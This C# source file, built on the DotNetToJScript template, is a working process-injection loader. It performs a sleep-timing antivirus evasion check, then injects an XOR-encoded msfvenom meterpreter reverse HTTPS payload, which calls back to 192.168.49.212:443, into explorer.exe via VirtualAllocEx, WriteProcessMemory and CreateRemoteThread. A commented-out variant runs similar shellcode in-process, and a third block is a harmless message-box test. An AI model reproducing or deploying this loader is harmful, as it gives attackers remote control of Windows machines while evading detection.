//    This file is part of DotNetToJScript.
//    Copyright (C) James Forshaw 2017
//
//    DotNetToJScript is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    DotNetToJScript is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with DotNetToJScript.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
//using System.Threading.Tasks;

namespace Process_Injection_ShellCode
{
    public class TestClass
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int PROCESSBASICINFORMATION = 0;


        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public TestClass()
        {
            // AV evasion: Sleep for 10s and detect if time really passedaa
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }


            // 1. Find a process to inject our shellcode into the memory
            Process[] expProc = Process.GetProcessesByName("explorer"); int pid = expProc[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            // 2. Allocate ShellCode into that proccess memory
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.212 LPORT=443 EXITFUNC=thread -f csharp
            // xor-encoded with key 0xfa
            byte[] buf = new byte[723] {
0x06,0xb2,0x79,0x1e,0x0a,0x12,0x36,0xfa,0xfa,0xfa,0xbb,0xab,0xbb,
0xaa,0xa8,0xb2,0xcb,0x28,0xab,0x9f,0xb2,0x71,0xa8,0x9a,0xac,0xb2,
0x71,0xa8,0xe2,0xb2,0x71,0xa8,0xda,0xb2,0x71,0x88,0xaa,0xb2,0xf5,
0x4d,0xb0,0xb0,0xb7,0xcb,0x33,0xb2,0xcb,0x3a,0x56,0xc6,0x9b,0x86,
0xf8,0xd6,0xda,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0x18,0x17,0xa8,
0xb2,0x71,0xa8,0xda,0xbb,0xab,0x71,0xb8,0xc6,0xb2,0xfb,0x2a,0x9c,
0x7b,0x82,0xe2,0xf1,0xf8,0xf5,0x7f,0x88,0xfa,0xfa,0xfa,0x71,0x7a,
0x72,0xfa,0xfa,0xfa,0xb2,0x7f,0x3a,0x8e,0x9d,0xb2,0xfb,0x2a,0xbe,
0x71,0xba,0xda,0xb3,0xfb,0x2a,0xaa,0x71,0xb2,0xe2,0x19,0xac,0xb7,
0xcb,0x33,0xb2,0x05,0x33,0xbb,0x71,0xce,0x72,0xb2,0xfb,0x2c,0xb2,
0xcb,0x3a,0x56,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0xc2,0x1a,0x8f,
0x0b,0xb6,0xf9,0xb6,0xde,0xf2,0xbf,0xc3,0x2b,0x8f,0x22,0xa2,0xbe,
0x71,0xba,0xde,0xb3,0xfb,0x2a,0x9c,0xbb,0x71,0xf6,0xb2,0xbe,0x71,
0xba,0xe6,0xb3,0xfb,0x2a,0xbb,0x71,0xfe,0x72,0xb2,0xfb,0x2a,0xbb,
0xa2,0xbb,0xa2,0xa4,0xa3,0xa0,0xbb,0xa2,0xbb,0xa3,0xbb,0xa0,0xb2,
0x79,0x16,0xda,0xbb,0xa8,0x05,0x1a,0xa2,0xbb,0xa3,0xa0,0xb2,0x71,
0xe8,0x13,0xb1,0x05,0x05,0x05,0xa7,0xb2,0xcb,0x21,0xa9,0xb3,0x44,
0x8d,0x93,0x94,0x93,0x94,0x9f,0x8e,0xfa,0xbb,0xac,0xb2,0x73,0x1b,
0xb3,0x3d,0x38,0xb6,0x8d,0xdc,0xfd,0x05,0x2f,0xa9,0xa9,0xb2,0x73,
0x1b,0xa9,0xa0,0xb7,0xcb,0x3a,0xb7,0xcb,0x33,0xa9,0xa9,0xb3,0x40,
0xc0,0xac,0x83,0x5d,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0x12,0xf5,0xfa,
0xfa,0xfa,0xcb,0xc3,0xc8,0xd4,0xcb,0xcc,0xc2,0xd4,0xce,0xc3,0xd4,
0xc8,0xcb,0xc8,0xfa,0xa0,0xb2,0x73,0x3b,0xb3,0x3d,0x3a,0x41,0xfb,
0xfa,0xfa,0xb7,0xcb,0x33,0xa9,0xa9,0x90,0xf9,0xa9,0xb3,0x40,0xad,
0x73,0x65,0x3c,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0x12,0x52,0xfa,0xfa,
0xfa,0xd5,0x8c,0xc9,0xa5,0xbd,0x88,0x8a,0xcc,0x95,0xc9,0xc9,0xbd,
0x95,0xaa,0xcc,0x91,0xc3,0x83,0x82,0xa0,0xcb,0x98,0xab,0xbb,0xb5,
0x95,0x97,0x9f,0xb2,0x9d,0xc8,0xab,0xa3,0xbe,0xb7,0xbd,0xaa,0xbb,
0xc8,0x8c,0x8d,0xb2,0xb9,0xa5,0x82,0xb4,0x9e,0x8a,0xb0,0xbf,0xa5,
0xb9,0x99,0x96,0xb9,0x80,0xce,0xcf,0xac,0x97,0xa5,0x8a,0x93,0xaf,
0x8a,0xa9,0xb2,0xcd,0xbb,0x8f,0xbe,0xbf,0x99,0xb8,0xbb,0xcd,0x9d,
0xc3,0x9f,0x92,0x9b,0x97,0xbd,0xb5,0xb2,0x91,0xa8,0xa0,0x9c,0x93,
0xad,0xc2,0xab,0xaa,0xb3,0xa5,0xad,0x9c,0x98,0xac,0xa9,0xbd,0x95,
0xb7,0x9e,0xc2,0xa2,0xc3,0xd7,0x9e,0x93,0x96,0x8c,0xc8,0xa9,0xb1,
0x9d,0xb6,0xb4,0xb2,0xae,0xb3,0x92,0x99,0x8e,0x8a,0x99,0xb0,0xbb,
0xa0,0xb0,0xb3,0xa2,0xb4,0x93,0x99,0xcb,0x9c,0x91,0xc9,0xaf,0xbf,
0x8a,0x8b,0xbb,0xa2,0x8e,0xa5,0xbc,0x82,0x9c,0x99,0x99,0xb9,0xb6,
0xae,0x99,0x98,0x99,0x8b,0xc8,0xb9,0xcf,0xbc,0xcb,0xbf,0xaa,0xfa,
0xb2,0x73,0x3b,0xa9,0xa0,0xbb,0xa2,0xb7,0xcb,0x33,0xa9,0xb2,0x42,
0xfa,0xc8,0x52,0x7e,0xfa,0xfa,0xfa,0xfa,0xaa,0xa9,0xa9,0xb3,0x3d,
0x38,0x11,0xaf,0xd4,0xc1,0x05,0x2f,0xb2,0x73,0x3c,0x90,0xf0,0xa5,
0xb2,0x73,0x0b,0x90,0xe5,0xa0,0xa8,0x92,0x7a,0xc9,0xfa,0xfa,0xb3,
0x73,0x1a,0x90,0xfe,0xbb,0xa3,0xb3,0x40,0x8f,0xbc,0x64,0x7c,0xfa,
0xfa,0xfa,0xfa,0x05,0x2f,0xb7,0xcb,0x3a,0xa9,0xa0,0xb2,0x73,0x0b,
0xb7,0xcb,0x33,0xb7,0xcb,0x33,0xa9,0xa9,0xb3,0x3d,0x38,0xd7,0xfc,
0xe2,0x81,0x05,0x2f,0x7f,0x3a,0x8f,0xe5,0xb2,0x3d,0x3b,0x72,0xe9,
0xfa,0xfa,0xb3,0x40,0xbe,0x0a,0xcf,0x1a,0xfa,0xfa,0xfa,0xfa,0x05,
0x2f,0xb2,0x05,0x35,0x8e,0xf8,0x11,0x50,0x12,0xaf,0xfa,0xfa,0xfa,
0xa9,0xa3,0x90,0xba,0xa0,0xb3,0x73,0x2b,0x3b,0x18,0xea,0xb3,0x3d,
0x3a,0xfa,0xea,0xfa,0xfa,0xb3,0x40,0xa2,0x5e,0xa9,0x1f,0xfa,0xfa,
0xfa,0xfa,0x05,0x2f,0xb2,0x69,0xa9,0xa9,0xb2,0x73,0x1d,0xb2,0x73,
0x0b,0xb2,0x73,0x20,0xb3,0x3d,0x3a,0xfa,0xda,0xfa,0xfa,0xb3,0x73,
0x03,0xb3,0x40,0xe8,0x6c,0x73,0x18,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,
0xb2,0x79,0x3e,0xda,0x7f,0x3a,0x8e,0x48,0x9c,0x71,0xfd,0xb2,0xfb,
0x39,0x7f,0x3a,0x8f,0x28,0xa2,0x39,0xa2,0x90,0xfa,0xa3,0x41,0x1a,
0xe7,0xd0,0xf0,0xbb,0x73,0x20,0x05,0x2f
};

            // 2.5 Carrying on, decode the XOR payload
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            IntPtr outSize;

            // 3.Injection State
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);


        }
        public void RunProcess(string path)
        {
            Process.Start(path);
        }
    }


}




/* This one didn't work for some reasons? I need to check this code again.
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;


[ComVisible(true)]
public class TestClass
{


    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);

    //public static void runner()
    static void Main(string[] args)
    {

        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        if (t2 < 1.5)
        {
            return;
        }


        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            return;
        }

        byte[] buf = new byte[708] {
0x06,0xb2,0x79,0x1e,0x0a,0x12,0x36,0xfa,0xfa,0xfa,0xbb,0xab,0xbb,
0xaa,0xa8,0xab,0xb2,0xcb,0x28,0xac,0x9f,0xb2,0x71,0xa8,0x9a,0xb2,
0x71,0xa8,0xe2,0xb2,0x71,0xa8,0xda,0xb2,0xf5,0x4d,0xb0,0xb0,0xb2,
0x71,0x88,0xaa,0xb7,0xcb,0x33,0xb2,0xcb,0x3a,0x56,0xc6,0x9b,0x86,
0xf8,0xd6,0xda,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0x18,0x17,0xa8,
0xb2,0x71,0xa8,0xda,0x71,0xb8,0xc6,0xb2,0xfb,0x2a,0xbb,0xab,0x9c,
0x7b,0x82,0xe2,0xf1,0xf8,0xf5,0x7f,0x88,0xfa,0xfa,0xfa,0x71,0x7a,
0x72,0xfa,0xfa,0xfa,0xb2,0x7f,0x3a,0x8e,0x9d,0xb2,0xfb,0x2a,0xaa,
0xbe,0x71,0xba,0xda,0xb3,0xfb,0x2a,0x71,0xb2,0xe2,0x19,0xac,0xb7,
0xcb,0x33,0xb2,0x05,0x33,0xbb,0x71,0xce,0x72,0xb2,0xfb,0x2c,0xb2,
0xcb,0x3a,0x56,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0xc2,0x1a,0x8f,
0x0b,0xb6,0xf9,0xb6,0xde,0xf2,0xbf,0xc3,0x2b,0x8f,0x22,0xa2,0xbe,
0x71,0xba,0xde,0xb3,0xfb,0x2a,0x9c,0xbb,0x71,0xf6,0xb2,0xbe,0x71,
0xba,0xe6,0xb3,0xfb,0x2a,0xbb,0x71,0xfe,0x72,0xb2,0xfb,0x2a,0xbb,
0xa2,0xbb,0xa2,0xa4,0xa3,0xa0,0xbb,0xa2,0xbb,0xa3,0xbb,0xa0,0xb2,
0x79,0x16,0xda,0xbb,0xa8,0x05,0x1a,0xa2,0xbb,0xa3,0xa0,0xb2,0x71,
0xe8,0x13,0xb1,0x05,0x05,0x05,0xa7,0xb2,0xcb,0x21,0xa9,0xb3,0x44,
0x8d,0x93,0x94,0x93,0x94,0x9f,0x8e,0xfa,0xbb,0xac,0xb2,0x73,0x1b,
0xb3,0x3d,0x38,0xb6,0x8d,0xdc,0xfd,0x05,0x2f,0xa9,0xa9,0xb2,0x73,
0x1b,0xa9,0xa0,0xb7,0xcb,0x3a,0xb7,0xcb,0x33,0xa9,0xa9,0xb3,0x40,
0xc0,0xac,0x83,0x5d,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0x12,0xf5,0xfa,
0xfa,0xfa,0xcb,0xc3,0xc8,0xd4,0xcb,0xcc,0xc2,0xd4,0xce,0xc3,0xd4,
0xc8,0xc9,0xc3,0xfa,0xa0,0xb2,0x73,0x3b,0xb3,0x3d,0x3a,0x41,0xfb,
0xfa,0xfa,0xb7,0xcb,0x33,0xa9,0xa9,0x90,0xf9,0xa9,0xb3,0x40,0xad,
0x73,0x65,0x3c,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0x12,0x63,0xfa,0xfa,
0xfa,0xd5,0xa9,0x92,0xb0,0xc8,0xa8,0x8f,0xbb,0x83,0x9f,0x93,0xcc,
0x97,0xcc,0xb1,0x9c,0x8b,0x82,0x99,0x83,0xcc,0xc3,0x8d,0x82,0x80,
0x80,0xae,0xa9,0xb9,0x80,0xbc,0xad,0xad,0xc8,0xac,0xcd,0x95,0xa5,
0xb6,0xca,0xab,0x88,0x91,0xca,0xd7,0x95,0x8b,0xbb,0xbb,0xa3,0xae,
0xcb,0xb0,0xb2,0x8f,0xc9,0x82,0xbf,0x8b,0xbe,0x96,0x92,0xad,0xc8,
0xce,0x93,0x8a,0xbf,0xb8,0xb2,0xaf,0xcf,0xab,0xd7,0x9d,0x9c,0xb9,
0xae,0x98,0xb2,0x98,0x9f,0x8f,0xca,0xa3,0xa2,0xcd,0x9c,0x95,0xad,
0x8e,0x9b,0xa0,0xb6,0x8d,0x9b,0xb1,0x83,0xbf,0x8d,0xae,0xcc,0xa9,
0xa9,0xc9,0x8a,0xc2,0xca,0xc8,0x96,0xb4,0x91,0x92,0xc9,0xae,0x83,
0x8e,0xc9,0x8f,0xcf,0xb9,0x99,0x80,0xc9,0xab,0x9b,0x98,0xb8,0xb2,
0xab,0xb7,0x91,0x80,0x82,0xaa,0xd7,0x9b,0xcb,0xb7,0x9b,0xaa,0xa8,
0xcf,0xcd,0x91,0xad,0x8b,0x9d,0xb8,0xbe,0xcb,0x92,0xfa,0xb2,0x73,
0x3b,0xa9,0xa0,0xbb,0xa2,0xb7,0xcb,0x33,0xa9,0xb2,0x42,0xfa,0xc8,
0x52,0x7e,0xfa,0xfa,0xfa,0xfa,0xaa,0xa9,0xa9,0xb3,0x3d,0x38,0x11,
0xaf,0xd4,0xc1,0x05,0x2f,0xb2,0x73,0x3c,0x90,0xf0,0xa5,0xb2,0x73,
0x0b,0x90,0xe5,0xa0,0xa8,0x92,0x7a,0xc9,0xfa,0xfa,0xb3,0x73,0x1a,
0x90,0xfe,0xbb,0xa3,0xb3,0x40,0x8f,0xbc,0x64,0x7c,0xfa,0xfa,0xfa,
0xfa,0x05,0x2f,0xb7,0xcb,0x3a,0xa9,0xa0,0xb2,0x73,0x0b,0xb7,0xcb,
0x33,0xb7,0xcb,0x33,0xa9,0xa9,0xb3,0x3d,0x38,0xd7,0xfc,0xe2,0x81,
0x05,0x2f,0x7f,0x3a,0x8f,0xe5,0xb2,0x3d,0x3b,0x72,0xe9,0xfa,0xfa,
0xb3,0x40,0xbe,0x0a,0xcf,0x1a,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0xb2,
0x05,0x35,0x8e,0xf8,0x11,0x50,0x12,0xaf,0xfa,0xfa,0xfa,0xa9,0xa3,
0x90,0xba,0xa0,0xb3,0x73,0x2b,0x3b,0x18,0xea,0xb3,0x3d,0x3a,0xfa,
0xea,0xfa,0xfa,0xb3,0x40,0xa2,0x5e,0xa9,0x1f,0xfa,0xfa,0xfa,0xfa,
0x05,0x2f,0xb2,0x69,0xa9,0xa9,0xb2,0x73,0x1d,0xb2,0x73,0x0b,0xb2,
0x73,0x20,0xb3,0x3d,0x3a,0xfa,0xda,0xfa,0xfa,0xb3,0x73,0x03,0xb3,
0x40,0xe8,0x6c,0x73,0x18,0xfa,0xfa,0xfa,0xfa,0x05,0x2f,0xb2,0x79,
0x3e,0xda,0x7f,0x3a,0x8e,0x48,0x9c,0x71,0xfd,0xb2,0xfb,0x39,0x7f,
0x3a,0x8f,0x28,0xa2,0x39,0xa2,0x90,0xfa,0xa3,0x41,0x1a,0xe7,0xd0,
0xf0,0xbb,0x73,0x20,0x05,0x2f
};

        for (int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
        }

        int size = buf.Length;

        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
*/



/*
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
        MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
*/


